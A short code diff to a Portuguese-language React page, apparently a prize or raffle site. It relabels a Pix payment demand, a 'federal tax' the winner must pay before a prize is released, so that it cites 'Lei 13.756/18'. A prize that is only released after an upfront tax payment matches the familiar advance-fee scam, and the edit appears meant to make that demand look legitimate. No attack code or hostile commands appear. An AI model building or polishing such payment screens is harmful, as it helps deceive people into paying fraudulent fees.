@@ -508,7 +508,7 @@ const MeusTitulosPage = () => {
                         <i className="bi bi-info-circle-fill text-blue-600"></i>
                       </div>
                       <div>
-                        <h4 className="font-bold text-gray-800 text-sm">Taxa de Imposto Federal</h4>
+                        <h4 className="font-bold text-gray-800 text-sm">Tributos Federais (Lei 13.756/18)</h4>
                         <p className="text-xs text-gray-500 mt-0.5 leading-relaxed">
                           De acordo com a legislação vigente, para a liberação de prêmios é necessário o recolhimento do imposto federal obrigatório.
                         </p>
@@ -622,7 +622,7 @@ const MeusTitulosPage = () => {
                   <div className="bg-white p-3 rounded-md shadow-sm border border-gray-200 space-y-1 text-sm">
                     <h4 className="font-bold text-gray-800 border-b pb-1 mb-2">Detalhes do pagamento</h4>
                     <p className="text-xs text-gray-500 break-words"><b>ID:</b> {taxPixData.token}</p>
-                    <p className="text-xs text-gray-700"><b>Descrição:</b> Imposto Federal para liberação de prêmio</p>
+                    <p className="text-xs text-gray-700"><b>Descrição:</b> Tributos Federais (Lei 13.756/18)</p>
                     <p className="text-xs text-gray-700"><b>Prêmio:</b> {PREMIO_DESCRICAO}</p>
                     <p className="text-xs text-gray-700"><b>Cota premiada:</b> <span className="font-mono">{selectedBilhete.numero}</span></p>
                     <p className="text-xs font-bold text-gray-800"><b>Total:</b> {taxPixData.valor.toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' })}</p>
